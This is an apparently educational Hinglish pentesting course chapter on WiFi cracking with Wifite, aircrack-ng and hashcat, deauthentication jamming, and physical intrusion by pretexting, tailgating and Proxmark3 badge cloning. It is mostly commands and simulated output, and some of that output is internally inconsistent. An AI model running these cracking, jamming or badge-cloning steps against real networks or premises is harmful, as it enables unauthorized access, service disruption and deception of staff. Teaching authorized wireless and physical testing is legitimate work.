‚úÖ 12.5: Defense - HTTPS Everywhere & VPNs

**Key Takeaways:**
- Email headers reveal phishing attempts
- Process monitoring detects malware
- NoScript blocks JavaScript attacks
- ARP monitoring detects MITM attacks
- VPN + HTTPS = Maximum protection
- Defense in depth is critical

**Next Module:** Module 13 - Physical & WiFi Attacks (Final Module!)


=============================================================

# üéØ Module 13: Physical & WiFi Attacks (Bonus Module)

---

## üìö Topic 13.1: WiFi - Wifite (WEP/WPA Attack)

### üéØ Topic/Technique:
**Automated WiFi Cracking** - Wifite tool se WiFi passwords automatically crack karna.

### ü§î Yeh Kya Hai?
Wifite ek automated WiFi auditing tool hai jo wireless networks ko scan karta hai, handshakes capture karta hai, aur passwords crack karta hai - sab kuch automatically! Yeh aircrack-ng suite ka wrapper hai jo complex commands ko simple bana deta hai. Ek command se aap WEP, WPA, aur WPA2 networks crack kar sakte hain.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- WiFi security assessment
- Automated testing (manual commands ki zaroorat nahi)
- Multiple networks simultaneously test karna
- Client ko WiFi vulnerabilities demonstrate karna
- Realistic wireless attack simulation

### üéØ Practical Use (Asli Pentesting Mein):
- Wireless penetration testing
- WiFi security audit
- Password strength testing
- Network security assessment
- User awareness training

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Wifite Workflow:**
```
1. Enable monitor mode on wireless adapter
2. Scan for WiFi networks
3. Select target network(s)
4. Capture WPA handshake (deauth clients)
5. Crack password using wordlist
6. Display cracked password
```

**Attack Types:**
```
- WEP: Direct cracking (weak encryption)
- WPA/WPA2: Handshake capture + dictionary attack
- WPS: PIN brute force (if enabled)
```

### üëç Pros (Fayde):
- Fully automated (beginner-friendly)
- Multiple attack methods
- Handles multiple targets
- Color-coded output (easy to read)
- Saves captured handshakes
- Integrates with aircrack-ng, reaver, etc.

### üëé Cons (Nuksaan):
- Requires compatible wireless adapter
- Dictionary-dependent (weak wordlist = failure)
- Time-consuming (strong passwords take hours/days)
- May be illegal without permission
- Detectable (deauth attacks visible)

### ‚å®Ô∏è Zaroori Commands & Steps:

**Installation:**
```bash
# Kali Linux (pre-installed)
wifite
# wifite: Command to run Wifite tool
# Pre-installed in Kali Linux

# Ubuntu/Debian
sudo apt-get install wifite
# sudo: Root privileges required
# apt-get install: Package installation command
# wifite: Package name
# Installs wifite package
# Dependencies: aircrack-ng, reaver, pyrit
# Automatically installs required tools

# Check wireless adapter
iwconfig
# iwconfig: Wireless interface configuration tool
# Shows wireless interfaces
# Look for: wlan0, wlan1, etc.
# Displays: Interface name, mode, frequency, signal strength
```

**Basic Usage:**
```bash
# Run Wifite (automatic mode)
sudo wifite
# sudo: Root privileges required (wireless operations need root)
# wifite: Starts automated WiFi auditing tool
# Automatically:
# - Enables monitor mode
# - Scans networks
# - Shows targets
# - Prompts for selection
# All steps automated (beginner-friendly)

# Advanced options
sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt
# --wpa: Filter option (only WPA/WPA2 networks)
# Target only WPA/WPA2 networks
# --dict: Dictionary/wordlist parameter
# Specify wordlist for cracking
# /usr/share/wordlists/rockyou.txt: Path to wordlist file
# Common password list (14 million passwords)
# Contains: password123, qwerty, 123456, etc.

# Target specific network
sudo wifite --bssid AA:BB:CC:DD:EE:FF
# --bssid: BSSID filter option
# Target specific access point by MAC address
# AA:BB:CC:DD:EE:FF: Router's MAC address (BSSID)
# Only attacks this specific network

# Kill interfering processes
sudo wifite --kill
# --kill: Process killer option
# Automatically kills processes that interfere with monitor mode
# Processes: NetworkManager, wpa_supplicant, dhclient
# These processes prevent monitor mode from working
# Must be killed before WiFi attacks
```

### üíª Step-by-Step Example:

**Scenario: Cracking Home WiFi Password**

**Step 1: Start Wifite**
```bash
sudo wifite
# sudo: Root access required
# wifite: Automated WiFi cracking tool
# Wifite starts with banner:

 .;'                     `;,    
.;'  ,;'             `;,  `;,   WiFite v2.6.0
::   ::               ::   ::   
::   ::               ::   ::   automated wireless auditor
::   ::               ::   ::   
::   `:               :'   ::   designed for Linux
`:    :.             .:    :'   
 `:    `:           :'    :'    
  `:    `:         :'    :'     
   `:    `:       :'    :'      
    `:    `:     :'    :'       
     `:    `:   :'    :'        
      `:    `: :'    :'         
       `:    `:'    :'          
        `:    :    :'           
         `:   :   :'            
          `:  :  :'             
           `: : :'              
            `::'               
             ::                
            ,::.               
           ,:::'               
          ,::'                 
         ,:'                   

[+] Enabling monitor mode on wlan0... enabled wlan0mon
# Wifite automatically enables monitor mode
# wlan0: Original interface name (managed mode)
# wlan0mon: Monitor mode interface (can capture packets)
# Monitor mode: Promiscuous mode for packet capture
# Can see all WiFi traffic, not just own network

[+] Scanning for wireless networks...
# Wifite scans all WiFi channels
# Scans for 2.4GHz and 5GHz networks
# 2.4GHz: Channels 1-14
# 5GHz: Channels 36+
# Captures: SSID, BSSID, Channel, Encryption, Signal strength
# Builds target list
```

**Step 2: Network Scan Results**
```bash
# After 10 seconds of scanning:

   NUM                      ESSID   CH  ENCR  POWER  WPS?  CLIENT
   ---  -------------------------  ---  ----  -----  ----  ------
     1              Home_WiFi_5G    36  WPA2   85db   no       2
     2                  TP-Link-A     6  WPA2   72db  yes       1
     3              Neighbor_WiFi    11  WPA2   45db   no       0
     4                 Guest_WiFi     1  WPA    38db   no       1
     5                  NETGEAR-B     6  WEP    65db   no       3

# Explanation of columns:
# NUM: Target number (for selection)
# ESSID: Network name (SSID)
# CH: WiFi channel (1-14 for 2.4GHz, 36+ for 5GHz)
# ENCR: Encryption type (WEP, WPA, WPA2)
# POWER: Signal strength in dB (higher = closer/stronger)
# WPS?: WPS enabled (yes = vulnerable to PIN attack)
# CLIENT: Number of connected devices

# Analysis:
# Target 1: Home_WiFi_5G - Strong signal (85db), 2 clients (good for handshake)
# Target 2: TP-Link-A - WPS enabled (vulnerable!)
# Target 5: NETGEAR-B - WEP encryption (very weak, easy to crack)

[+] Select target(s) (1-5) separated by commas, or 'all': 1
# Wifite prompts for target selection
# User types: 1 (target number)
# Can select multiple: 1,2,3
# Or type 'all' for all networks
# User selects target 1 (Home_WiFi_5G)
```

**Step 3: Handshake Capture**
```bash
[+] Attacking Home_WiFi_5G (AA:BB:CC:DD:EE:FF)
# Wifite starts attack on selected target
# AA:BB:CC:DD:EE:FF: Router's MAC address (BSSID)
# BSSID: Unique identifier for access point

[+] Waiting for handshake...
# Wifite waits for WPA handshake
# Handshake: 4-way authentication between client and router
# Captured when client connects/reconnects
# Contains encrypted password
# Needed for password cracking

[+] Sending 5 deauth packets to client 11:22:33:44:55:66...
# Wifite sends deauth attack
# Deauth: Deauthentication packets
# 5: Number of packets to send
# 11:22:33:44:55:66: Client MAC address
# Forces client to disconnect from WiFi
# Client automatically reconnects
# During reconnection, handshake is captured

# Explanation of deauth process:
# 1. Wifite sends fake deauth packets to client
# 2. Packets appear to come from router (spoofed)
# 3. Client thinks router kicked them out
# 4. Client immediately tries to reconnect
# 5. During reconnection, 4-way handshake occurs
# 6. Wifite captures handshake packets
# 7. Handshake contains encrypted password

[+] Handshake captured! Saved to hs/Home_WiFi_5G_AA-BB-CC-DD-EE-FF.cap
# Handshake successfully captured!
# .cap file: Packet capture containing handshake
# hs/: Handshake directory
# Home_WiFi_5G_AA-BB-CC-DD-EE-FF.cap: Filename (SSID + BSSID)
# Saved for offline cracking
# Can crack later without WiFi connection
```

**Step 4: Password Cracking**
```bash
[+] Cracking WPA handshake using aircrack-ng...
# Wifite automatically starts cracking
# aircrack-ng: Password cracking tool
# Tries passwords from wordlist against captured handshake
# Dictionary attack: Tests each password from list

[+] Using wordlist: /usr/share/wordlists/rockyou.txt
# Wifite uses default wordlist
# rockyou.txt: 14 million common passwords
# Includes: password123, qwerty, 123456, etc.
# From 2009 RockYou data breach

# Cracking process (real-time output):
                                 Aircrack-ng 1.6

      [00:00:15] 15234/14344391 keys tested (1015.60 k/s)

      Time left: 3 hours 55 minutes

      Current passphrase: password123

# Explanation:
# 15234/14344391: Tested 15,234 passwords out of 14 million
# 1015.60 k/s: Testing 1,015 passwords per second
# Time left: Estimated time to try all passwords
# Current passphrase: Currently testing "password123"

# After 2 minutes:
                                 Aircrack-ng 1.6

      [00:02:34] 156789/14344391 keys tested (1018.23 k/s)

      KEY FOUND! [ MyHomeWiFi2024! ]

      Master Key     : AB CD EF 01 23 45 67 89 AB CD EF 01 23 45 67 89
                       AB CD EF 01 23 45 67 89 AB CD EF 01 23 45 67 89

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

# SUCCESS! Password found: MyHomeWiFi2024!
# Master Key: Encryption key derived from password
# Transient Key: Session-specific key
```

**Step 5: Results Summary**
```bash
[+] Cracked Home_WiFi_5G (AA:BB:CC:DD:EE:FF)!
[+] SSID: Home_WiFi_5G
[+] BSSID: AA:BB:CC:DD:EE:FF
[+] Password: MyHomeWiFi2024!
[+] Handshake saved to: hs/Home_WiFi_5G_AA-BB-CC-DD-EE-FF.cap

[+] Cracked 1 target(s), 0 failed

# Results saved to: cracked.txt
# Contains: SSID, BSSID, Password, Timestamp

# Verify password:
sudo nmcli dev wifi connect "Home_WiFi_5G" password "MyHomeWiFi2024!"
# nmcli: NetworkManager command-line interface
# dev wifi connect: Connect to WiFi network
# "Home_WiFi_5G": SSID (network name)
# password "MyHomeWiFi2024!": Cracked password
# Connects to WiFi using cracked password
# If successful: Password is correct!
# If fails: Wrong password or other issue
```

### üí° Pro Tip / Galti:

**Pro Tip**: Use custom wordlist for faster cracking:

```bash
# Bad: Using full rockyou.txt (14 million passwords)
sudo wifite --dict /usr/share/wordlists/rockyou.txt
# Time: Hours to days
# Success rate: High (if password is common)

# Good: Use targeted wordlist
# Create custom wordlist based on target:
cat > custom_wordlist.txt << EOF
HomeWiFi2024
MyHomeWiFi2024!
Home_WiFi_5G
Password123
Wifi@Home
FamilyWiFi2024
EOF
# Contains: Variations of network name, common patterns

sudo wifite --dict custom_wordlist.txt
# Time: Seconds to minutes
# Success rate: High (if password follows pattern)

# Generate wordlist from target info
crunch 8 12 -t Home@@@@2024 -o custom.txt
# crunch: Wordlist generator tool
# 8 12: Min 8, max 12 characters length
# -t: Pattern template option
# Home@@@@2024: "Home" + 4 random chars + "2024"
# @@@@: 4 lowercase letters
# -o: Output file option
# custom.txt: Output filename
# Generates: Homeabcd2024, Homeefgh2024, etc.
# Targeted wordlist based on SSID pattern

# Better: Use crunch to generate wordlist
crunch 8 12 -t Home%%%% > wordlist.txt
# crunch: Wordlist generator
# 8 12: Min 8, max 12 characters
# -t Home%%%%: Pattern (Home + 4 digits)
# %%%%: 4 numeric digits (0-9)
# >: Redirect output to file
# wordlist.txt: Output file
# Generates: Home0000, Home0001, ..., Home9999
# 10,000 possible combinations

# Best: Combine multiple wordlists
cat rockyou.txt custom.txt crunch.txt > combined.txt
sudo wifite --dict combined.txt
# Maximum coverage
```

**Common Mistake**: Attacking without clients connected:

```
‚ùå Bad: No clients connected
# Target network has 0 clients
# Cannot capture handshake (no one to deauth)
# Attack fails

‚úì Good: Wait for clients
# Monitor network until client connects
# Or attack during peak hours (evening)
# Higher chance of capturing handshake

‚úì Better: Target networks with multiple clients
# More clients = more chances
# Can deauth multiple clients
# Faster handshake capture
```

---

## üìö Topic 13.2: WiFi - Aircrack-ng (Handshake Capture)

### üéØ Topic/Technique:
**Manual WPA Handshake Capture** - Aircrack-ng suite use karke step-by-step WiFi cracking.

### ü§î Yeh Kya Hai?
Aircrack-ng ek complete WiFi security suite hai jo individual tools provide karta hai har step ke liye - monitoring, packet injection, handshake capture, aur password cracking. Wifite ke comparison mein yeh manual hai, lekin zyada control aur flexibility deta hai. Professional pentesters aircrack-ng prefer karte hain kyunki yeh powerful aur customizable hai.

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Aircrack-ng Suite:**
```
airmon-ng: Monitor mode enable/disable
airodump-ng: Network scanning & packet capture
aireplay-ng: Packet injection & deauth attacks
aircrack-ng: Password cracking
```

### ‚å®Ô∏è Zaroori Commands & Steps:

**Step-by-Step Process:**
```bash
# Step 1: Enable monitor mode
sudo airmon-ng start wlan0
# sudo: Root privileges
# airmon-ng: Monitor mode manager tool
# start: Enable monitor mode command
# wlan0: Wireless interface name
# Creates: wlan0mon (monitor mode interface)
# Switches from managed to monitor mode

# Output:
PHY     Interface       Driver          Chipset
phy0    wlan0           ath9k           Atheros AR9271

                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

# Explanation:
# - Monitor mode enabled on wlan0mon
# - Station mode (normal WiFi) disabled
# - Can now capture packets from all networks

# Step 2: Scan for networks
sudo airodump-ng wlan0mon
# sudo: Root access
# airodump-ng: Packet capture and network scanner
# wlan0mon: Monitor mode interface
# Scans all channels (1-14 for 2.4GHz)
# Displays: BSSID, PWR, Beacons, Data, Channel, Encryption, ESSID
# Real-time network discovery

# Output:
CH  6 ][ Elapsed: 12 s ][ 2024-01-15 14:30

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
 AA:BB:CC:DD:EE:FF  -45       23       15    2   6  54e  WPA2 CCMP   PSK  Home_WiFi
 11:22:33:44:55:66  -67       18        0    0  11  54e  WPA2 CCMP   PSK  Neighbor_WiFi

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe
 AA:BB:CC:DD:EE:FF  77:88:99:AA:BB:CC  -42    0 - 1      0       12  Home_WiFi

# Explanation:
# Top section: Access Points (routers)
# - BSSID: Router MAC address
# - PWR: Signal strength (-45 = strong, -67 = weak)
# - Beacons: Beacon frames sent by router
# - #Data: Data packets captured
# - CH: WiFi channel
# - ENC: Encryption (WPA2)
# - ESSID: Network name

# Bottom section: Connected Clients
# - STATION: Client MAC address (77:88:99:AA:BB:CC)
# - Connected to: AA:BB:CC:DD:EE:FF (Home_WiFi)

# Step 3: Capture handshake (focused)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# airodump-ng: Packet capture tool
# -c 6: Channel option (focus on channel 6 only)
# Faster capture (not hopping channels)
# --bssid AA:BB:CC:DD:EE:FF: BSSID filter (target specific router)
# -w capture: Write option (save packets to file)
# capture: Filename prefix (creates capture-01.cap)
# wlan0mon: Monitor interface
# Captures only target network traffic

# Output:
CH  6 ][ Elapsed: 1 min ][ 2024-01-15 14:31 ][ WPA handshake: AA:BB:CC:DD:EE:FF

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
 AA:BB:CC:DD:EE:FF  -45 100       89      234   12   6  54e  WPA2 CCMP   PSK  Home_WiFi

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe
 AA:BB:CC:DD:EE:FF  77:88:99:AA:BB:CC  -42    0 - 1      0      156  Home_WiFi

# Top right corner shows: "WPA handshake: AA:BB:CC:DD:EE:FF"
# This means handshake captured successfully!
# File saved: capture-01.cap

# Step 4: Deauth attack (force handshake)
# Open new terminal (keep airodump-ng running)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 77:88:99:AA:BB:CC wlan0mon
# sudo: Root access
# aireplay-ng: Packet injection tool
# --deauth 10: Deauth option (send 10 deauth packets)
# 10: Number of deauth packets
# -a AA:BB:CC:DD:EE:FF: Access point MAC (router BSSID)
# -c 77:88:99:AA:BB:CC: Client MAC (device to disconnect)
# wlan0mon: Monitor interface
# Forces client to reconnect (captures handshake)

# Output:
14:32:15  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 6
14:32:15  Sending 64 directed DeAuth (code 7). STMAC: [77:88:99:AA:BB:CC] [ACK]
14:32:15  Sending 64 directed DeAuth (code 7). STMAC: [77:88:99:AA:BB:CC] [ACK]
14:32:16  Sending 64 directed DeAuth (code 7). STMAC: [77:88:99:AA:BB:CC] [ACK]

# Explanation:
# - Sending deauth packets to client
# - Client disconnects from WiFi
# - Client automatically reconnects
# - During reconnection, handshake captured
# - [ACK]: Acknowledgment received (packet sent successfully)

# Check airodump-ng terminal:
# Top right now shows: "WPA handshake: AA:BB:CC:DD:EE:FF"
# Handshake captured!

# Step 5: Crack password
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
# sudo: Root access
# aircrack-ng: Password cracking tool
# -w: Wordlist option
# /usr/share/wordlists/rockyou.txt: Wordlist file path
# capture-01.cap: Captured handshake file
# Tests each password from wordlist against handshake

# Output:
Opening capture-01.cap
Reading packets, please wait...

                                 Aircrack-ng 1.6

      [00:00:00] 1/1 keys tested (0.00 k/s)

      Time left: --

                           KEY FOUND! [ MyHomeWiFi2024! ]

      Master Key     : AB CD EF 01 23 45 67 89 AB CD EF 01 23 45 67 89
                       AB CD EF 01 23 45 67 89 AB CD EF 01 23 45 67 89

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

# Password found: MyHomeWiFi2024!
```

### üí° Pro Tip / Galti:

**Pro Tip**: Verify handshake before cracking:

```bash
# Verify handshake is valid
sudo aircrack-ng capture-01.cap
# aircrack-ng: Without -w option, just analyzes file
# capture-01.cap: File to analyze
# Checks if handshake is present

# Output should show:
# 1 handshake
# If shows "0 handshake" ‚Üí Capture again
# Must have valid handshake before cracking

# Check handshake quality
sudo pyrit -r capture-01.cap analyze
# pyrit: Advanced WPA cracking tool
# -r: Read option
# capture-01.cap: Handshake file
# analyze: Analysis command
# Shows: Handshake quality, ESSID, BSSID
# Good quality = Faster cracking
# Quality score: 0-100%
```

---

## üìö Topic 13.3: WiFi - Hashcat (Handshake Cracking)

### üéØ Topic/Technique:
**GPU-Accelerated Password Cracking** - Hashcat use karke fast WiFi password cracking.

### ü§î Yeh Kya Hai?
Hashcat duniya ka fastest password cracking tool hai jo GPU (Graphics Card) ka power use karta hai. CPU-based cracking (aircrack-ng) se 100x faster hai. Agar aircrack-ng 1000 passwords per second try karta hai, toh Hashcat 100,000+ passwords per second try kar sakta hai! Complex passwords crack karne ke liye essential hai.

### ‚å®Ô∏è Zaroori Commands & Steps:

```bash
# Convert .cap to .hccapx (Hashcat format)
cap2hccapx capture-01.cap capture.hccapx
# cap2hccapx: Format conversion tool
# capture-01.cap: Aircrack-ng format (input)
# capture.hccapx: Hashcat format (output)
# Hashcat requires .hccapx format

# Crack with Hashcat
hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt
# hashcat: GPU-accelerated password cracker
# -m 2500: Hash mode (WPA/WPA2)
# 2500: Mode number for WPA-EAPOL-PBKDF2
# capture.hccapx: Handshake file
# rockyou.txt: Wordlist
# Uses GPU for 100x faster cracking

# GPU-accelerated cracking
hashcat -m 2500 -w 3 -O capture.hccapx rockyou.txt
# -w 3: Workload profile option
# 1=low (desktop usable), 2=default, 3=high (GPU intensive), 4=nightmare (max power)
# -O: Optimized kernel option
# Faster but limited password length (max 31 chars)
# Uses more GPU memory

# Show cracked password
hashcat -m 2500 capture.hccapx --show
# hashcat: With --show option
# --show: Display previously cracked passwords
# Reads from hashcat.potfile (cracked passwords cache)
# No cracking, just displays results
```

### üí° Pro Tip / Galti:

**Pro Tip**: Use mask attack for targeted cracking:

```bash
# If you know password pattern:
# Example: "Home" + 4 digits (Home1234, Home5678, etc.)

hashcat -m 2500 -a 3 capture.hccapx "Home?d?d?d?d"
# hashcat: GPU cracker
# -a 3: Attack mode 3 (mask attack/brute force)
# capture.hccapx: Handshake file
# "Home?d?d?d?d": Mask pattern
# ?d: Digit placeholder (0-9)
# Tries: Home0000 to Home9999
# 10,000 combinations
# Much faster than wordlist!
# Completes in minutes instead of hours
```

---

## üìö Topic 13.4: WiFi - Jamming (Deauth Attack)

### üéØ Topic/Technique:
**WiFi Denial of Service** - Deauthentication packets se WiFi disconnect karna.

### ü§î Yeh Kya Hai?
Deauth attack mein attacker fake deauthentication packets bhejta hai jo clients ko WiFi se disconnect kar dete hain. Yeh packets router se aate hue dikhte hain (spoofed), isliye client disconnect ho jata hai. Continuous deauth packets bhejne se WiFi completely unusable ho jata hai - yeh WiFi jamming hai.

### ‚å®Ô∏è Zaroori Commands & Steps:

```bash
# Deauth all clients from network
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
# sudo: Root access
# aireplay-ng: Packet injection tool
# --deauth 0: Infinite deauth packets (continuous jamming)
# 0: Unlimited (keeps sending until stopped)
# -a AA:BB:CC:DD:EE:FF: Target router MAC (BSSID)
# wlan0mon: Monitor interface
# Disconnects ALL clients from this network
# WiFi becomes unusable

# Deauth specific client
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c 77:88:99:AA:BB:CC wlan0mon
# -c 77:88:99:AA:BB:CC: Client MAC option (target specific client)
# Only this client gets disconnected
# Other clients remain connected
# Targeted attack

# Continuous jamming (loop)
while true; do sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon; done
# while true: Infinite loop
# do: Execute command
# sudo aireplay-ng --deauth 10: Send 10 deauth packets
# done: End of loop
# Sends 10 deauth packets repeatedly
# WiFi becomes unusable
# Press Ctrl+C to stop
```

### üí° Pro Tip / Galti:

**Pro Tip**: Use mdk4 for advanced jamming:

```bash
# Install mdk4
sudo apt-get install mdk4
# apt-get install: Package installer
# mdk4: WiFi testing/jamming tool

# Beacon flood (fake networks)
sudo mdk4 wlan0mon b -f fake_ssids.txt
# mdk4: WiFi attack tool
# wlan0mon: Monitor interface
# b: Beacon flood mode
# -f fake_ssids.txt: File with fake network names
# Creates hundreds of fake WiFi networks
# Confuses WiFi scanners
# Hides real networks in noise

# Deauth flood (disconnect all)
sudo mdk4 wlan0mon d -c 6
# d: Deauth mode (mass deauthentication)
# -c 6: Channel option (channel 6)
# Jams all networks on channel 6
# Affects all APs and clients on that channel
```

---

## üìö Topic 13.5: Physical - Pretexting, Tailgating, Badge Cloning

### üéØ Topic/Technique:
**Physical Security Testing** - Social engineering aur physical access techniques.

### ü§î Yeh Kya Hai?

**Pretexting**: Fake identity ya scenario create karke access gain karna.
**Tailgating**: Authorized person ke peeche building mein enter hona.
**Badge Cloning**: RFID badges clone karke unauthorized access.

### ‚å®Ô∏è Zaroori Commands & Steps:

**Badge Cloning (Proxmark3):**
```bash
# Read RFID badge
proxmark3> lf search
# proxmark3>: Proxmark3 command prompt
# lf: Low frequency RFID (125kHz)
# search: Auto-detect card type command
# Scans for: EM410x, HID, Indala, etc.
# Reads badge data
# Displays: Card type, ID, data

# Clone to blank card
proxmark3> lf t55xx clone --source 1
# lf t55xx: T55xx writable chip commands
# t55xx: Writable RFID chip (blank card)
# clone: Copy data command
# --source 1: From slot 1 (previously read data)
# Writes data to blank card

# Write to new badge
# Place blank card on Proxmark3
# Data written to new card
# Now you have cloned badge!
# Identical to original
```

### üíª Step-by-Step Example:

**Scenario: Physical Penetration Test**

**Step 1: Reconnaissance**
```
- Observe employee behavior
- Note badge types (RFID, magnetic)
- Identify smoking areas (tailgating opportunity)
- Check security guard routines
- Document entry/exit times
```

**Step 2: Pretexting**
```
Attacker: "Hi, I'm John from IT. Got a call about network issues on 3rd floor."
Guard: "Do you have a badge?"
Attacker: "Oh no, I left it in my car. Can you give me a temporary pass? It's urgent."
Guard: "Sure, sign here."

# Success! Gained entry through social engineering
```

**Step 3: Tailgating**
```
- Wait near entrance during lunch rush
- Follow group of employees
- Hold door for them (builds trust)
- Walk in confidently
- Act like you belong

# No badge needed!
```

**Step 4: Badge Cloning**
```
- Use Proxmark3 in backpack
- Stand near employee in elevator
- Clone badge wirelessly (proximity reader)
- Use cloned badge later for access

# Physical access = Game over
```

### üí° Pro Tip / Galti:

**Pro Tip**: Confidence is key:

```
‚ùå Bad: Nervous, looking around, asking questions
‚úì Good: Confident walk, purposeful, minimal interaction
‚úì Better: Wear uniform, carry clipboard, act busy

Real Example:
Pentester wore delivery uniform, carried box, walked to server room.
Guard: "Need help?"
Pentester: "Nah, just dropping this for IT."
Guard: "Okay!"

Result: Full server room access, no badge!
```

---

**üéâüéâüéâ MODULE 13 COMPLETE! üéâüéâüéâ**
**üéäüéäüéä ENTIRE COURSE COMPLETE! üéäüéäüéä**

**Topics Covered:**
‚úÖ 13.1: WiFi - Wifite (Automated Cracking)
‚úÖ 13.2: WiFi - Aircrack-ng (Manual Handshake Capture)
‚úÖ 13.3: WiFi - Hashcat (GPU Cracking)
‚úÖ 13.4: WiFi - Jamming (Deauth Attack)
‚úÖ 13.5: Physical - Pretexting, Tailgating, Badge Cloning

**Complete Course Summary:**
‚úÖ Module 1: Foundation & Human Psychology
‚úÖ Module 2: Information Gathering (OSINT)
‚úÖ Module 3: Weaponization 1 (Windows Payloads)
‚úÖ Module 4: Weaponization 2 (Advanced Evasion)
‚úÖ Module 5: Cross-Platform Payloads
‚úÖ Module 6: Phishing Infrastructure
‚úÖ Module 7: Advanced Phishing Campaigns
‚úÖ Module 8: Delivery & Client-Side Exploitation
‚úÖ Module 9: Network-Level Attacks (MITM)
‚úÖ Module 10: Post-Exploitation (Meterpreter)
‚úÖ Module 11: Post-Exploitation (Empire & C2)
‚úÖ Module 12: Defense & Counter-Intelligence
‚úÖ Module 13: Physical & WiFi Attacks

**Total: 13 Modules | 80+ Topics | Complete Social Engineering Course!**

**Congratulations! üéì**
Aapne successfully complete Social Engineering course finish kar liya!

**Remember:**
üîí Use ethically and legally only
üîí Always get written permission
üîí Responsible disclosure
üîí Help make internet safer

**Happy Ethical Hacking! üéØüõ°Ô∏èüíª**

=============================================================
